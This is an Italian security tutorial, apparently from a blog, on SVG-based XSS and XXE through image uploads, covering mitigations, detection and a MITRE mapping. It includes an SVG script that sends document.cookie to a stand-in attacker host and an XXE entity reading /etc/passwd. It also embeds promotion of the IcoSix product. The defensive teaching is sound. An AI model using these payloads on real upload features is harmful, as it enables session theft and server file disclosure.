---
title: 'SVG XSS e XXE: attacco tramite upload di immagini'
slug: svg-xss-xxe
description: 'Un SVG caricato può eseguire script o leggere file locali. Guida pratica su XSS e XXE via SVG: payload reali, vettori d''attacco e mitigazioni per sviluppatori.'
image: /svg-xss-xxe-attacco-upload-immagini.webp
draft: false
date: 2026-09-21T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - SVG
  - XSS
  - XXE
  - File Upload
  - Web Application Security
---

# SVG XSS e XXE: Quando un'Immagine Vettoriale Diventa un Exploit

**SVG XSS** è l'esecuzione di JavaScript nascosto dentro un file SVG caricato o embeddato in una pagina; **SVG XXE** è la lettura di file locali o SSRF ottenuta dichiarando entità XML esterne nello stesso file. Entrambi sfruttano lo stesso difetto strutturale: un file SVG non è un'immagine come JPEG o PNG, ma un documento XML testuale che può contenere script, gestori di evento e riferimenti a entità esterne che un parser esegue davvero. Se un'applicazione accetta upload SVG, li renderizza inline o li passa a una libreria di elaborazione immagini senza sanitizzazione, apre entrambe le superfici d'attacco.

## Perché SVG è diverso da PNG o JPEG

PNG e JPEG sono formati binari raster: pixel e metadati, nessun codice eseguibile. SVG è testo XML puro, con tag come `<script>`, `<foreignObject>`, gestori di evento (`onload`, `onerror`, `onmouseover`) e, soprattutto, la possibilità di dichiarare un `DOCTYPE` con entità esterne — la stessa meccanica che rende pericoloso qualsiasi parser XML mal configurato (vedi [XXE](https://hackita.it/articoli/xxe/) e [XXE Injection](https://hackita.it/articoli/xxe-injection/) per la teoria completa).

Il problema nasce quando un browser o una libreria server-side trattano l'SVG come "solo un'immagine" e in realtà lo interpretano come documento attivo.

## SVG XSS: script dentro un'immagine

Il payload più diretto sfrutta il tag `<script>` o un gestore di evento:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40" />
</svg>
```

O con `<script>` esplicito:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    fetch('https://attacker.tld/steal?c=' + document.cookie)
  </script>
</svg>
```

**Il contesto di embedding decide se il payload esegue:**

| Metodo di embedding                                                                | Script eseguito? | Note                                         |
| ---------------------------------------------------------------------------------- | ---------------- | -------------------------------------------- |
| `<img src="file.svg">`                                                             | No               | Il browser sandboxizza, niente esecuzione JS |
| `<object data="file.svg">`                                                         | Sì               | Contesto documento completo                  |
| `<iframe src="file.svg">`                                                          | Sì               | Stesso rischio di object                     |
| `<svg>` inline nell'HTML                                                           | Sì               | Il DOM del parent include lo script          |
| Upload servito con `Content-Type: image/svg+xml` e aperto direttamente nel browser | Sì               | La vittima naviga il file come documento     |

Questo è il motivo per cui un semplice controllo "estensione .svg = immagine, va bene" è insufficiente: dipende tutto da come il file viene servito e referenziato dopo l'upload. Per la superficie generale di upload malevoli vedi [File Upload Attack](https://hackita.it/articoli/file-upload-attack/).

## SVG XXE: entità esterne dentro l'XML

Essendo XML, un SVG può dichiarare un DOCTYPE con entità esterne, la tecnica classica di [XXE Injection](https://hackita.it/articoli/xxe-injection/):

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Se il parser XML lato server (non il browser) elabora questo file senza disabilitare `DTD`/entità esterne — tipico di pipeline che convertono, ridimensionano o "puliscono" SVG server-side — il contenuto del file letto finisce dentro il testo renderizzato o in un errore di parsing che lo espone.

Caso reale noto: **ImageTragick (CVE-2016-3714)**, dove ImageMagick elaborava SVG malevoli passando comandi al delegate, portando a RCE oltre che a lettura file. Librerie come librsvg o Apache Batik hanno avuto CVE simili nel tempo legate a gestione DTD non sicura.

## Vettori pratici dove questo colpisce

* **Avatar/upload profilo**: l'utente carica un SVG come immagine profilo, il backend lo processa con una libreria di conversione/resize
* **Loghi personalizzabili in SaaS multi-tenant**: white-label che permette upload logo aziendale in SVG
* **Editor grafici/collaborativi**: import SVG da URL esterno o file
* **Convertitori immagine-to-SVG online mal implementati**: se il tool esegue parsing lato server senza hardening

## Detection e Blue Team

* **Log del parser**: errori XML con riferimenti a `file://`, `http://`, `ftp://` in un campo che dovrebbe contenere solo un'immagine sono un segnale forte
* **WAF/IDS**: regole che intercettano `<!DOCTYPE`, `<!ENTITY`, `<script`, `onload=`, `onerror=` dentro payload con `Content-Type: image/svg+xml` o estensione `.svg`
* **EDR/monitoring outbound**: un processo di image processing (ImageMagick, librsvg) che genera traffico di rete inatteso è quasi sempre XXE-driven SSRF
* **Header di risposta**: verificare che i file SVG serviti abbiano `Content-Disposition: attachment` e `X-Content-Type-Options: nosniff` — dettagli approfonditi in [Security Headers](https://hackita.it/articoli/security-headers/)

## Mitigazioni

**Lato parsing XML (fix strutturale contro XXE):**

* Disabilitare DTD e entità esterne nel parser (`libxml_disable_entity_loader(true)` in PHP, `XMLInputFactory` con `SUPPORT_DTD` a false in Java, `resolve_entities=False` in lxml Python)
* Non usare mai un parser XML "di default" su input utente senza aver verificato esplicitamente la configurazione entità

**Lato rendering (fix contro XSS):**

* Sanitizzare l'SVG rimuovendo `<script>`, gestori `on*`, `<foreignObject>` prima di servirlo — librerie come DOMPurify (client) o SVG sanitizer dedicati (server) fanno questo lavoro
* Servire sempre gli SVG upload con `Content-Disposition: attachment`, mai renderizzarli inline nel DOM della tua applicazione
* Applicare una [CSP](https://hackita.it/articoli/xss-csp-bypass/) restrittiva come ulteriore livello, non come unica difesa

**La mitigazione più efficace resta evitare il problema alla radice.** Se la tua applicazione deve offrire agli utenti un set di icone o badge personalizzabili (avatar, loghi di sezione, elementi UI), usare una libreria di icone SVG già pronte e verificate come [IcoSix](https://www.icosix.com/) elimina completamente la superficie d'attacco: l'utente sceglie da un set controllato, non carica file arbitrari che il tuo backend deve poi parsare.

Lo stesso vale quando serve il percorso inverso — trasformare un logo raster in vettoriale per un cliente o un progetto interno: invece di implementare un parser di conversione fatto in casa (spesso il punto debole reale, come visto sopra con ImageTragick), un tool di conversione già testato come il [PNG to SVG Converter di IcoSix](https://www.icosix.com/png-to-svg/) evita di esporre la tua infrastruttura a un componente di parsing scritto internamente e mai sottoposto a review di sicurezza.

## MITRE ATT\&CK

| Tecnica                               | ID                                | Contesto                                             |
| ------------------------------------- | --------------------------------- | ---------------------------------------------------- |
| Exploit Public-Facing Application     | T1190                             | Upload SVG malevolo come vettore d'ingresso          |
| Drive-by Compromise                   | T1189                             | SVG XSS servito e aperto dalla vittima               |
| Exploitation for Client Execution     | T1203                             | Esecuzione script nel contesto browser               |
| Server-Side Request Forgery (via XXE) | T1190 (sotto-tecnica applicativa) | Entità esterne che triggerano richieste SSRF interne |

## Errori comuni

| Errore                                                                              | Perché è un problema                               |
| ----------------------------------------------------------------------------------- | -------------------------------------------------- |
| Validare solo l'estensione `.svg`                                                   | Il contenuto XML non viene mai ispezionato         |
| Bloccare `<script>` ma non i gestori `on*`                                          | `onload`, `onerror` bypassano filtri naive         |
| Fidarsi del `Content-Type` dichiarato dal client                                    | È controllato interamente dall'attaccante          |
| Sanitizzare solo lato client (JS)                                                   | Bypassabile intercettando/modificando la richiesta |
| Usare una libreria di image processing "di default" senza verificarne la config XML | Molte hanno DTD abilitato out-of-the-box           |

## FAQ

**Un SVG caricato come `<img>` può eseguire JavaScript?**
No, il tag `<img>` sandboxizza il rendering SVG e blocca script e gestori di evento. Il rischio esiste quando il file viene aperto come documento (`<object>`, `<iframe>`, navigazione diretta) o embeddato inline nel DOM.

**Basta rinominare l'estensione per bloccare SVG malevoli?**
No. Il controllo deve avvenire sul contenuto (magic bytes/parsing), non sull'estensione, che è banalmente falsificabile.

**Tutti i parser XML sono vulnerabili a XXE di default?**
Dipende dal linguaggio e dalla versione della libreria: molte hanno reso sicuro il default negli anni recenti, ma non è garantito su ogni combinazione libreria/versione — va sempre verificato esplicitamente, mai assunto.

**Un tool di conversione immagini online è sempre sicuro?**
No di per sé — dipende da come processa l'SVG lato server. Un tool maturo e verificato riduce il rischio rispetto a un parser scritto internamente senza review, ma la sicurezza va sempre valutata caso per caso.

**Come si previene XXE nei file SVG?**
Disabilitando DTD ed entità esterne nel parser XML usato per processare gli upload (non nel browser, che non è il punto vulnerabile) — è l'unico fix strutturale, non basta filtrare pattern sospetti nel contenuto del file.
